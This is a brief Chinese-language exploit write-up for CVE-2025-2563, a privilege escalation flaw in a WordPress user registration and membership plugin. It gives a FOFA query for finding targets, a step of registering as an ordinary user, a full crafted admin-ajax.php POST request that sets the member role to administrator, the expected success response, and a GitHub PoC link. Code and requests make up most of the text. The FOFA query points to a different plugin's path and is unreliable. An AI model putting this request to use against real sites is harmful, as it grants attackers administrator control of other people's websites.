## WordPress (User Registration & Membership) Plugin权限提升漏洞(CVE-2025-2563)

## fofa
```
"/wp-content/plugins/wp-automatic"
```
## 第一步
通过 /registration 或 /membership-registration 前端页面注册
## 第二步，注册后，使用该请求数据
```
POST /wp-admin/admin-ajax.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: */*
Host: hackthebox.test
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=--------------------------189123966817005614765335

----------------------------189123966817005614765335
Content-Disposition: form-data; name="action"

user_registration_membership_register_member
----------------------------189123966817005614765335
Content-Disposition: form-data; name="security"

THE_NONCE_HERE
----------------------------189123966817005614765335
Content-Disposition: form-data; name="members_data"

{"membership":"MEMBERSHIP_ID","payment_method":"free","start_date":"2025-3-29","username":"REGISTERED_USERNAME","role":"administrator"}
----------------------------189123966817005614765335--
```
## 第三步，返回相应包如下
```
{
    "success": true,
    "data": {
        "member_id": 24,
        "transaction_id": "",
        "message": "New member has been successfully created."
    }
}  
```
## github地址
https://github.com/ubaydev/CVE-2025-2563
